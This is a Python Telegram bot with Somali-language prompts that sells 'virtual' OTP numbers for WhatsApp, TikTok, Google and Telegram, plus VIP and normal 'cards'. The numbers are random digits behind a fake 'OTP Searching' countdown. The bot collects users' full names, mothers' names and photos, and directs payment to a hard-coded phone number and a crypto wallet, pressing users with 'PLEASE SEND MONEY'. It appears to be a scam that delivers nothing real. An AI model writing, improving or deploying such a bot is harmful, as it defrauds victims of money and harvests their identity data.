import os, random, asyncio, logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(BOT_TOKEN, parse_mode="Markdown")
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

# ================= STORAGE =================
users = {}  # user data storage

# ================= STATES =================
class CardState(StatesGroup):
    full_name = State()
    mother = State()
    photo = State()
    payment_screenshot = State()

class CodeState(StatesGroup):
    code = State()

# ================= HELPERS =================
def normal_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4,9))
    return "+25263" + d*3 + str(random.randint(0,9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

async def countdown(msg, text, sec=5):
    for i in range(sec,0,-1):
        await msg.edit_text(f"{text}\n⏳ {i} sec")
        await asyncio.sleep(1)
    await msg.edit_text("Processing...")

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="New Order"),
                   KeyboardButton(text="Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================= VIRTUAL =================
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="WhatsApp", callback_data="v_WhatsApp")],
        [InlineKeyboardButton(text="TikTok", callback_data="v_TikTok")],
        [InlineKeyboardButton(text="Google", callback_data="v_Google")],
        [InlineKeyboardButton(text="Telegram", callback_data="v_Telegram")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_"))
async def virtual_platform(call: CallbackQuery):
    number = normal_number()
    code = generate_code()
    users[call.from_user.id] = {
        "type":"virtual",
        "platform":call.data[2:],  # WhatsApp/TikTok/...
        "number":number,
        "code":code,
        "approved":False
    }
    # Animation OTP Searching
    msg = await call.message.edit_text("OTP Searching...")
    await countdown(msg,"OTP Searching",5)
    # Payment choice Local/Crypto
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_crypto")]
    ])
    await msg.edit_text(f"Number: {number}\nDir Lacag si aad u hesho OTP", reply_markup=kb)

# ================= VIRTUAL PAYMENT =================
@dp.callback_query(F.data=="v_local")
async def v_local(call: CallbackQuery):
    user = users[call.from_user.id]
    user["payment_method"]="local"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm")],
        [InlineKeyboardButton(text="CANCEL", callback_data="v_cancel")]
    ])
    await call.message.edit_text(
        "Numberkan Lacagta ku dir:\n+252907868526",
        reply_markup=kb
    )

@dp.callback_query(F.data=="v_crypto")
async def v_crypto(call: CallbackQuery):
    user = users[call.from_user.id]
    user["payment_method"]="crypto"
    text = (
        "Send Crypto:\n\n"
        "BNB:\n`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "USDT-BEP20:\n`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "Taabo si uu auto-copy u noqdo."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm")],
        [InlineKeyboardButton(text="CANCEL", callback_data="v_cancel")]
    ])
    await call.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data=="v_confirm")
async def v_confirm(call: CallbackQuery):
    user = users[call.from_user.id]
    msg = await call.message.edit_text("Admin Approval... ⏳")
    
    # 10-sec animation, kadib haddii admin ma aqbalin
    async def wait_admin():
        for i in range(10,0,-1):
            await msg.edit_text(f"Admin Approval... ⏳ {i} sec")
            await asyncio.sleep(1)
        if not user.get("approved"):
            await msg.edit_text("PLEASE SEND MONEY 💵")
    
    asyncio.create_task(wait_admin())
    
    # Notify admin
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="APPROVE", callback_data=f"approve_{call.from_user.id}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"reject_{call.from_user.id}")]
    ])
    await bot.send_message(
        ADMIN_ID,
        f"Virtual Payment Request\nUser:{call.from_user.id}\nPlatform:{user['platform']}\nNumber:{user['number']}\nPayment:{user['payment_method']}",
        reply_markup=kb
    )

@dp.callback_query(F.data=="v_cancel")
async def v_cancel(call: CallbackQuery):
    await call.message.edit_text("Cancelled ❌")

# ================= CARD =================
@dp.callback_query(F.data == "card")
async def card(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIP - $15", callback_data="vip")],
        [InlineKeyboardButton(text="NORMAL - $1", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)

@dp.callback_query(F.data.in_(["vip","normal"]))
async def card_type(call: CallbackQuery, state:FSMContext):
    number = vip_number() if call.data=="vip" else normal_number()
    users[call.from_user.id] = {
        "type":"card",
        "level":call.data,
        "number":number,
        "approved":False
    }
    await call.message.answer("Geli Magaca Saddexan:")
    await state.set_state(CardState.full_name)

@dp.message(CardState.full_name)
async def name(msg:Message,state:FSMContext):
    users[msg.from_user.id]["name"]=msg.text
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother)

@dp.message(CardState.mother)
async def mother(msg:Message,state:FSMContext):
    users[msg.from_user.id]["mother"]=msg.text
    await msg.answer("Soo dir Sawirkaaga:")
    await state.set_state(CardState.photo)

@dp.message(CardState.photo, F.photo)
async def photo(msg:Message,state:FSMContext):
    users[msg.from_user.id]["photo"]=msg.photo[-1].file_id
    kb=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL",callback_data="c_local")],
        [InlineKeyboardButton(text="CRYPTO",callback_data="c_crypto")]
    ])
    await msg.answer("Dooro Payment Method:",reply_markup=kb)

# ================= CARD PAYMENT =================
@dp.callback_query(F.data=="c_local")
async def c_local(call: CallbackQuery):
    user = users[call.from_user.id]
    user["payment_method"]="local"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="c_confirm")],
        [InlineKeyboardButton(text="CANCEL", callback_data="c_cancel")]
    ])
    await call.message.edit_text(
        "Numberkan Lacagta ku dir:\n+252907868526",
        reply_markup=kb
    )

@dp.callback_query(F.data=="c_crypto")
async def c_crypto(call: CallbackQuery):
    user = users[call.from_user.id]
    user["payment_method"]="crypto"
    text=(
        "Send Crypto:\n\n"
        "BNB:\n`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "USDT-BEP20:\n`0x98ffcb29a4fc182d461ebdba54648d8fe24597ac`\n\n"
        "Taabo si uu auto-copy u noqdo."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="c_confirm")],
        [InlineKeyboardButton(text="CANCEL", callback_data="c_cancel")]
    ])
    await call.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data=="c_confirm")
async def c_confirm(call: CallbackQuery):
    user = users[call.from_user.id]
    msg = await call.message.edit_text("Admin Approval... ⏳")
    
    async def wait_admin():
        for i in range(10,0,-1):
            await msg.edit_text(f"Admin Approval... ⏳ {i} sec")
            await asyncio.sleep(1)
        if not user.get("approved"):
            await msg.edit_text("PLEASE SEND MONEY 💵")
    
    asyncio.create_task(wait_admin())
    
    # Notify admin
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="APPROVE", callback_data=f"approve_{call.from_user.id}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"reject_{call.from_user.id}")]
    ])
    await bot.send_message(
        ADMIN_ID,
        f"Card Request\nUser:{call.from_user.id}\nName:{user['name']}\nMother:{user['mother']}\nLevel:{user['level']}\nNumber:{user['number']}\nPayment:{user['payment_method']}",
        reply_markup=kb
    )

@dp.callback_query(F.data=="c_cancel")
async def c_cancel(call: CallbackQuery):
    await call.message.edit_text("Cancelled ❌")

# ================= ADMIN APPROVE/REJECT =================
@dp.callback_query(F.data.startswith("approve_"))
async def approve(call: CallbackQuery):
    uid = int(call.data.split("_")[1])
    user = users.get(uid)
    if not user:
        return
    user["approved"] = True
    code = generate_code()
    user["code"] = code
    await bot.send_message(uid,
        f"Approved ✅\nCode: {code}\n\nGeli CHECK CODE si aad u hesho Number-kaaga.")
    # Update admin message
    try:
        await call.message.edit_caption("Approved ✅")
    except:
        await call.message.edit_text("Approved ✅")

@dp.callback_query(F.data.startswith("reject_"))
async def reject(call: CallbackQuery):
    uid = int(call.data.split("_")[1])
    users[uid]["approved"]=False
    await bot.send_message(uid, "Rejected ❌")
    try:
        await call.message.edit_caption("Rejected ❌")
    except:
        await call.message.edit_text("Rejected ❌")

# ================= CHECK CODE =================
@dp.message(F.text=="Check Code")
async def check(msg:Message,state:FSMContext):
    await msg.answer("Geli Code-ka:")
    await state.set_state(CodeState.code)

@dp.message(CodeState.code)
async def verify(msg:Message,state:FSMContext):
    user = users.get(msg.from_user.id)
    if not user:
        await msg.answer("Ma jiro codsi aad hore u dirtay ❌")
        await state.clear()
        return
    if msg.text == user.get("code"):
        await msg.answer(f"Number-kaaga:\n{user['number']}")
    else:
        await msg.answer("Code khaldan ❌")
    await state.clear()
